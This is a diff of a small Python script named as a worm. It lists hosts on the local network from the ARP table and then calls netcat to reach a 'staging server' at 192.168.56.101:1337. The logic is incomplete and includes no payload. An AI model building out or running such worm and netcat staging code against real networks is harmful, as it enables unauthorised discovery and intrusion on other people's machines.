@@ -1,23 +1,33 @@
 #!/usr/bin/env python
 
 import subprocess
+import re
 
 def worm_spread():
  
-    machines = subprocess.check_output(["arp", "-a"])
-    print(machines)
+    arp_list = subprocess.check_output(["arp", "-a"])
 
-    machine_list = machines.split()
+    pattern = r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}'   
+    
+    ips = re.findall(pattern, arp_list)
 
-    for i in machine_list:
-        #parse for ip addresses- contain more than 13 charac but less than 17
-        if len(i) > 13 and len(i) < 17:
+    print(ips)
+
+    for i in ips:
+        if i.endswith(".1") == True:
+            break
+        elif i.endswith(".100") == True:
+            break
+        elif i.endswith(".101") == True:
+            break
+        else:
             print(i)
 
-(worm_spread())
+worm_spread()
 
 
 def nc_listener():
     #sending to staging server via netcat
     subprocess.call(["nc", "192.168.56.101", "1337"])
+
 print(nc_listener())
